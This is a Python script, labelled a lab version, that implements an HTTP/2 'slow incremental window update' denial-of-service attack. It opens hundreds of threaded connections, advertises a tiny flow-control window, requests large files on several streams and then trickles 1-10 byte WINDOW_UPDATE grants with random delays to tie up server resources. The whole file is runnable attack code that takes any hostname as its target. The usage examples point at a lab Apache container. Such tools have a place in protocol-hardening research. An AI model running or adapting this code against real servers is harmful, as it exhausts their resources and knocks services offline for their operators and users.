#!/usr/bin/env python3
"""
HTTP/2 Slow Incremental Window Update Attack - Lab Version
Based on successful zero_window_attack.py implementation.

This attack exploits HTTP/2's flow control by sending minimal window increments,
forcing servers to transmit data at artificially slow rates. This weaponizes the
protocol's sliding window mechanism to create resource exhaustion.

PROTOCOL BACKDOOR: HTTP/2 allows clients to control server transmission speed
through WINDOW_UPDATE frames. This legitimate feature becomes a vector for
resource exhaustion when clients provide minimal window space.
"""

import socket
import threading
import h2.connection
import h2.events
import time
import argparse
import logging
import sys
import random
from typing import List
import signal

class HTTP2SlowIncrementalAttack:
    """HTTP/2 Slow Incremental Window Attack implementation for lab environment"""
    
    def __init__(self, target_host: str, target_port: int = 80, num_connections: int = 512, 
                 min_increment: int = 1, max_increment: int = 10):
        self.target_host = target_host
        self.target_port = target_port
        self.num_connections = num_connections
        self.min_increment = min_increment
        self.max_increment = max_increment
        self.active_connections: List[socket.socket] = []
        self.attack_active = True
        
    def create_connection(self, conn_id: int) -> bool:
        """Create a single HTTP/2 connection with slow incremental window updates"""
        try:
            # Create TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(10.0)
            
            logging.info(f"[Connection {conn_id}] Connecting to {self.target_host}:{self.target_port}")
            sock.connect((self.target_host, self.target_port))
            
            # Initialize HTTP/2 connection
            h2_conn = h2.connection.H2Connection()
            h2_conn.initiate_connection()
            
            # Send connection preface
            sock.sendall(h2_conn.data_to_send())
            
            # Configure very small initial window size (not zero, but tiny)
            h2_conn.update_settings({
                h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: self.min_increment,
                h2.settings.SettingCodes.MAX_FRAME_SIZE: 16384
            })
            sock.sendall(h2_conn.data_to_send())
            
            # Wait for server settings
            data = sock.recv(1024)
            events = h2_conn.receive_data(data)
            
            for event in events:
                if isinstance(event, h2.events.RemoteSettingsChanged):
                    logging.debug(f"[Connection {conn_id}] Server settings received")
                elif isinstance(event, h2.events.SettingsAcknowledged):
                    logging.debug(f"[Connection {conn_id}] Settings acknowledged")
            
            # Send settings ACK
            sock.sendall(h2_conn.data_to_send())
            
            # Create multiple streams to maximize impact
            for stream_id in range(1, 9, 2):  # Streams 1, 3, 5, 7
                headers = [
                    (':method', 'GET'),
                    (':path', '/large-test.jpg'),  # Request large file
                    (':scheme', 'http'),
                    (':authority', f'{self.target_host}:{self.target_port}'),
                    ('accept', '*/*'),
                    ('accept-encoding', 'identity'),  # Prevent compression
                    ('cache-control', 'no-cache')
                ]
                
                h2_conn.send_headers(stream_id, headers, end_stream=True)
                sock.sendall(h2_conn.data_to_send())
                
                logging.debug(f"[Connection {conn_id}] Created stream {stream_id}")
            
            # Keep connection alive with slow incremental window updates
            self.maintain_slow_connection(sock, h2_conn, conn_id)
            return True
            
        except Exception as e:
            logging.error(f"[Connection {conn_id}] Failed: {e}")
            if 'sock' in locals():
                sock.close()
            return False
    
    def maintain_slow_connection(self, sock: socket.socket, h2_conn: h2.connection.H2Connection, conn_id: int):
        """Maintain connection with slow incremental window updates"""
        logging.info(f"[Connection {conn_id}] Starting slow incremental window attack")
        
        sock.settimeout(1.0)  # Non-blocking reads
        last_window_update = time.time()
        bytes_received = 0
        total_window_granted = self.min_increment  # Track total window size granted
        
        while self.attack_active:
            try:
                # Try to read server data
                try:
                    data = sock.recv(4096)
                    if data:
                        # Process HTTP/2 events
                        events = h2_conn.receive_data(data)
                        
                        for event in events:
                            if isinstance(event, h2.events.DataReceived):
                                bytes_received += len(event.data)
                                logging.debug(f"[Connection {conn_id}] Received {len(event.data)} bytes "
                                            f"on stream {event.stream_id} (total: {bytes_received})")
                                
                                # Key difference: Send tiny window updates to allow more data
                                # but at a very slow rate
                                increment = random.randint(self.min_increment, self.max_increment)
                                
                                # Update both connection and stream windows
                                h2_conn.increment_flow_control_window(increment)
                                h2_conn.increment_flow_control_window(increment, stream_id=event.stream_id)
                                sock.sendall(h2_conn.data_to_send())
                                
                                total_window_granted += increment * 2  # Both connection and stream
                                
                                logging.debug(f"[Connection {conn_id}] Granted +{increment} bytes window "
                                            f"(total granted: {total_window_granted})")
                                
                                # Small delay to slow down data flow - this is key to the attack
                                time.sleep(random.uniform(0.1, 0.5))
                                
                    else:
                        logging.warning(f"[Connection {conn_id}] Server closed connection")
                        break
                        
                except socket.timeout:
                    # Timeout is expected, continue with periodic updates
                    pass
                
                # Send periodic small window updates to keep connection alive
                # even when no data is being received
                current_time = time.time()
                if current_time - last_window_update > random.uniform(5, 15):  # Every 5-15 seconds
                    try:
                        # Small periodic window update to prevent connection death
                        periodic_increment = random.randint(1, 3)
                        
                        h2_conn.increment_flow_control_window(periodic_increment)
                        sock.sendall(h2_conn.data_to_send())
                        
                        total_window_granted += periodic_increment
                        last_window_update = current_time
                        
                        logging.debug(f"[Connection {conn_id}] Periodic window update: +{periodic_increment} "
                                    f"(total: {total_window_granted})")
                    except Exception as update_error:
                        logging.error(f"[Connection {conn_id}] Periodic update failed: {update_error}")
                        break
                
                # Keep connection alive with minimal resource usage
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                logging.error(f"[Connection {conn_id}] Connection maintenance error: {e}")
                break
        
        # Cleanup
        try:
            sock.close()
        except:
            pass
        logging.info(f"[Connection {conn_id}] Connection closed "
                   f"(received: {bytes_received} bytes, granted: {total_window_granted} bytes)")
    
    def run_attack(self):
        """Launch the HTTP/2 slow incremental window attack"""
        logging.info(f"🚀 Starting HTTP/2 Slow Incremental Window Attack")
        logging.info(f"🎯 Target: {self.target_host}:{self.target_port}")
        logging.info(f"🔗 Connections: {self.num_connections}")
        logging.info(f"📦 Window increments: {self.min_increment}-{self.max_increment} bytes")
        logging.info(f"💀 Attack: Slow data flow via tiny window updates")
        
        threads = []
        
        # Create attack threads
        for i in range(self.num_connections):
            thread = threading.Thread(
                target=self.create_connection,
                args=(i + 1,),
                name=f"SlowIncThread-{i+1}"
            )
            threads.append(thread)
            thread.start()
            
            # Stagger connection attempts
            time.sleep(0.2)
        
        logging.info(f"📡 All {self.num_connections} slow incremental attack threads launched")
        
        try:
            # Monitor attack progress
            while self.attack_active:
                active_threads = sum(1 for t in threads if t.is_alive())
                logging.info(f"📊 Active connections: {active_threads}/{self.num_connections}")
                time.sleep(15)
                
        except KeyboardInterrupt:
            logging.info("\n🛑 Attack interrupted by user")
            self.stop_attack()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=5)
        
        logging.info("✅ Attack completed")
    
    def stop_attack(self):
        """Stop the attack gracefully"""
        self.attack_active = False
        logging.info("🔴 Stopping attack...")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    logging.info("\n🛑 Received shutdown signal")
    sys.exit(0)

def test_target_connectivity(host: str, port: int) -> bool:
    """Test if target is reachable"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def main():
    parser = argparse.ArgumentParser(
        description='HTTP/2 Slow Incremental Window Attack - Lab Version',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Attack lab Apache container (from within attacker container)
  python3 slow_inc_window_attack.py apache-victim --port 80 --connections 15
  
  # Attack with custom window increments
  python3 slow_inc_window_attack.py apache-victim --min-increment 1 --max-increment 5 --verbose
        """
    )
    
    parser.add_argument('target', help='Target hostname (e.g., apache-victim)')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--connections', type=int, default=512, 
                       help='Number of concurrent connections (default: 512)')
    parser.add_argument('--min-increment', type=int, default=1,
                       help='Minimum window increment in bytes (default: 1)')
    parser.add_argument('--max-increment', type=int, default=10,
                       help='Maximum window increment in bytes (default: 10)')
    parser.add_argument('--verbose', '-v', action='store_true', 
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.min_increment < 1:
        logging.error("Minimum increment must be at least 1 byte")
        return 1
    if args.max_increment < args.min_increment:
        logging.error("Maximum increment must be >= minimum increment")
        return 1
    
    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%H:%M:%S'
    )
    
    # Suppress noisy h2/hpack debug messages
    logging.getLogger('h2').setLevel(logging.WARNING)
    logging.getLogger('hpack').setLevel(logging.WARNING)
    
    # Install signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Validate target connectivity
    logging.info(f"🔍 Testing connectivity to {args.target}:{args.port}")
    if not test_target_connectivity(args.target, args.port):
        logging.error(f"❌ Cannot reach {args.target}:{args.port}")
        logging.error("💡 Make sure the lab is running: ./run_lab.sh")
        return 1
    
    logging.info(f"✅ Target {args.target}:{args.port} is reachable")
    
    # Create and run attack
    try:
        attack = HTTP2SlowIncrementalAttack(
            args.target, 
            args.port, 
            args.connections,
            args.min_increment,
            args.max_increment
        )
        attack.run_attack()
    except Exception as e:
        logging.error(f"💥 Attack failed: {e}")
        return 1
    
    return 0

if __name__ == '__main__':
    sys.exit(main())